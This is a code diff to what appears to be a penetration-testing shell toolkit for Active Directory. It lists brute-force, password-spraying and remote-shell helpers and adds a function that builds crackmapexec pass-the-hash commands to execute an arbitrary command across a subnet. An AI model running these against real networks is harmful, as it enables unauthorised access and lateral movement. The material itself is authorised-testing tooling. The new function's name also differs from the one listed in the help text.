@@ -10,17 +10,12 @@ nb-ad-rce
 ----------
 The nb-ad-rce namespace provides commands for getting shells/remote code execution on a target system.
 
-Scanning
---------
-nb-ad-rce-nmap-winrm           scan hosts for open winrm port
-
 Brute Force Attacks
 -------------------
-nb-ad-rce-brute-hydra                brute force password/login for a user account with hydra
-nb-ad-rce-brute-cme                  brute force password/login for a user account with cme
-nb-ad-rce-pass-spray                 perform password spraying in a domain
-nb-ad-rce-brute-winrm                brute force password/login for a user account for winrm
-nb-ad-rce-cme-pass                   pass the password/hash on a network subnet
+nb-ad-rce-brute-hydra          brute force password/login for a user account with hydra
+nb-ad-rce-brute-cme            brute force password/login for a user account with cme
+nb-ad-rce-pass-spray           perform password spraying in a domain
+nb-ad-rce-brute-winrm          brute force password/login for a user account for winrm
 
 Getting Shells
 --------------
@@ -29,6 +24,12 @@ nb-ad-rce-evil-winrm           connect via winrm to a target host
 nb-ad-rce-psexec               connect via psexec to a target host
 nb-ad-rce-wmiexec              connect via wmiexec to a target host
 nb-ad-rce-psexec-msf           connect via metasploit's psexec to a target host
+
+Misc
+----
+nb-ad-rce-nmap-winrm           scan hosts for open winrm port
+nb-ad-rce-cme-pass             pass the password/hash on a network subnet
+nb-ad-rce-cme-command          pass the password/hash on a network subnet and execute command
 
 DOC
 }
@@ -421,6 +422,43 @@ nb-ad-rce-cme-pass() {
         __ask "Enter the NTLM hash for authentication"
         __check-hash
         print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netpath)/cme-sweep.txt"
+    else
+        echo
+        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
+    fi
+}
+
+nb-ad-enum-auth-cme-command() {
+    __check-project
+    nb-vars-set-network
+    nb-vars-set-user
+
+    __ask "Enter command to execute such as whoami /all"
+    local cm && __askvar cm "COMMAND"
+
+    __ask "Do you want to log in using a password or a hash? (p/h)"
+    local login && __askvar login "LOGIN_OPTION"
+
+    if [[ $login == "p" ]]; then
+        __ask "Do you want to add a domain? (y/n)"
+        local add_domain && __askvar add_domain "ADD_DOMAIN_OPTION"
+
+        if [[ $add_domain == "y" ]]; then
+            __ask "Enter the domain"
+            nb-vars-set-domain
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -x "$cm" | tee $(__netpath)/cme-command-sweep.txt"
+        else
+            __ask "Enter a password for authentication"
+            nb-vars-set-pass
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -x "$cm" | tee $(__netpath)/cme-command-sweep.txt"
+        fi
+    elif [[ $login == "h" ]]; then
+        echo
+        __ask "Enter the NTLM hash for authentication"
+        __check-hash
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -x "$cm" | tee $(__netpath)/cme-command-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
